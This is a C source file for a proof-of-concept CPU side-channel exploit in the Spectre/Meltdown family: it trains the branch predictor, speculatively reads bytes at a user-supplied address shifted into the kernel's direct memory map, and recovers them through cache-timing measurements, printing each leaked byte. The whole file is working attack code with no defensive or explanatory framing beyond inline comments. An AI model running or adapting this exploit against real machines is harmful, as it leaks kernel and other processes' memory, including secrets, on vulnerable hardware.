#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>

#include <x86intrin.h>

/* comment out if getting illegal insctructions error */
#ifndef HAVE_RDTSCP
# define HAVE_RDTSCP 1
#endif

#if !(defined(__x86_64__) || defined(__i386__))
# error "Only x86-64 and i386 are supported at the moment"
#endif


#define TARGET_OFFSET	12
#define TARGET_SIZE	(1 << TARGET_OFFSET)
#define BITS_READ	8
#define VARIANTS_READ	(1 << BITS_READ)

static char target_array[VARIANTS_READ * TARGET_SIZE];

void clflush_target(void)
{
	int i;

	for (i = 0; i < VARIANTS_READ; i++)
		_mm_clflush(&target_array[i * TARGET_SIZE]);
}

void victim_function(unsigned long addr, size_t count) {
	if (((float)count+3.0)/3 * ((float)count+6.0)/3 > 12.1)
		asm volatile (
		"xorq %%rax, %%rax\n"
		"1:\n"
		"movb (%%rcx), %%al\n"
		"shl $12, %%rax\n"
		"movq (%%rbx,%%rax,1), %%rbx\n"
		:
		: "c"(addr), "b"(target_array)
		: "rax"
	);
}

static inline int
get_access_time(volatile char *addr)
{
	int time1, time2, junk;
	volatile int j;

#if HAVE_RDTSCP
	time1 = __rdtscp(&junk);
	j = *addr;
	time2 = __rdtscp(&junk);
#else
	time1 = __rdtsc();
	j = *addr;
	_mm_mfence();
	time2 = __rdtsc();
#endif

	return time2 - time1;
}

static int cache_hit_threshold;
static int hist[VARIANTS_READ];
void check(void)
{
	int i, time, mix_i;
	volatile char *addr;

	for (i = 0; i < VARIANTS_READ; i++) {
		mix_i = ((i * 167) + 13) & 255;

		addr = &target_array[mix_i * TARGET_SIZE];
		time = get_access_time(addr);

		if (time <= cache_hit_threshold)
			hist[mix_i]++;
	}
}

#define CYCLES 1000
int readbyte(unsigned long addr)
{
	int i, ret = 0, max = -1, maxi = -1, j;
	unsigned long access_addr, training_access_addr;
	char trainstr = 255;

	memset(hist, 0, sizeof(hist));

	for (i = 0; i < CYCLES; i++) {
		clflush_target();

		training_access_addr = (unsigned long)(&trainstr);
		for (j = 29; j >= 0; j--) {
			_mm_clflush(&target_array[trainstr * TARGET_SIZE]);
			for (volatile int z = 0; z < 100; z++) {}	/* Delay (can also mfence) */
	
			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			access_addr = ((j % 6) - 1) & ~0xFFFF;	/* Set access_addr=FFF.FF0000 if j%6==0, else access_addr=0 */
			access_addr = (access_addr | (access_addr >> 16));	/* Set access_addr=-1 if j%6=0, else access_addr=0 */
			access_addr = training_access_addr ^ (access_addr & (addr ^ training_access_addr));

			/* Call the victim! */
			victim_function(access_addr, j % 6 + 6);
		}
		check();
	}

	for (i = 1; i < VARIANTS_READ; i++) {
		if (!isprint(i))
			continue;
		if (hist[i] && hist[i] > max) {
			max = hist[i];
			maxi = i;
		}
	}

	return maxi;
}

static int mysqrt(long val)
{
	int root = val / 2, prevroot = 0, i = 0;

	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}

	return root;
}

#define ESTIMATE_CYCLES	1000000
static void
set_cache_hit_threshold(void)
{
	long cached, uncached, i;

	if (0) {
		cache_hit_threshold = 80;
		return;
	}

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (cached = 0, i = 0; i < ESTIMATE_CYCLES; i++)
		cached += get_access_time(target_array);

	for (uncached = 0, i = 0; i < ESTIMATE_CYCLES; i++) {
		_mm_clflush(target_array);
		uncached += get_access_time(target_array);
	}

	cached /= ESTIMATE_CYCLES;
	uncached /= ESTIMATE_CYCLES;

	cache_hit_threshold = mysqrt(cached * uncached);

	printf("cached = %ld, uncached = %ld, threshold %d\n",
	       cached, uncached, cache_hit_threshold);
}

static int min(int a, int b)
{
	return a < b ? a : b;
}

static char *progname;
int usage(void)
{
	printf("%s: [hexaddr] [size]\n", progname);
	return 2;
}

int main(int argc, char *argv[])
{
	int ret, i;
	unsigned long addr, size;

	memset(target_array, 1, sizeof(target_array));
	set_cache_hit_threshold();

    progname = argv[0];
	if (argc < 3)
		return usage();

	if (sscanf(argv[1], "%lx", &addr) != 1)
		return usage();

	if (sscanf(argv[2], "%lx", &size) != 1)
		return usage();
		
	addr += 0xffff880000000000;

	for (i = 0; i < size; i++) {
		ret = readbyte(addr);
		if (ret == -1)
			ret = 0xff;
		printf("read %lx = %x %c (score=%d/%d)\n",
		       addr, ret, isprint(ret) ? ret : ' ',
		       ret != 0xff ? hist[ret] : 0,
		       CYCLES);
		addr++;
	}

	return 0;
}
